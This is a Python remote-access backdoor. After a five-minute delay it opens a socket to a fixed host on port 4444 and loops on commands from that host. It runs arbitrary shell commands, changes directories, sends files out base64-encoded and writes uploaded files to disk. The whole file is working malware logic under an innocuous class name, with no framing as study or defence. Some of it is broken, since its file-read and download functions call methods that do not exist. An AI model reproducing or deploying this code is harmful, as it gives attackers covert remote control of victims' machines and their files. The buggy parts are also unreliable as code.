import json
import os
import socket,time
import subprocess,base64,sys,shutil
class whtsup:
	def __init__(self):
		if True==True:
			pass
		time.sleep(300)	
		self.tion=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		print("started\n")
		self.tion.connect(('192.168.1.18',4444))
		print("[+]Connection done")

	def reliable_send(self,data):
		json_data=json.dumps(data.decode('utf8'))
		self.tion.send(json_data.encode('utf8'))

	def reliable_recieve(self):
		json_data=self.tion.recv(1024)
		# print(json_data)
		return json.loads(json_data)

	def cg(self,path):
		os.chdir(path)
		return "[+] chng working directory to " + path

	def r(self,path):
		with open(path,"rb") as file:
			return base64.b64encode(file.r())
     
	def write_file(self,path,content):
		with open(path,"wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload successful"

	def execute_system_command(self,command):

		return subprocess.check_output(command,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)

	def run(self):	
		while True: 
			command=self.reliable_recieve()
			# try:
			if command[0] =="exit":
				self.tion.close()
				sys.exit()
			elif command[0]=="cd" and len(command)>1:
				command_result=self.cg(command[1])
				json_data=json.dumps(command_result)
				self.tion.send(json_data.encode('utf8'))
				continue
			elif command[0]=="download" and "[-] Error" not in command:
				command_result=self.r_file(command[1])
			elif command[0]=="upload":
				command_result=self.write_file(command[1],command[2])
			else:
				command_result=self.execute_system_command(str(command[0]))

			self.reliable_send(command_result)
			

my_whatsup=whtsup()
my_whatsup.run()


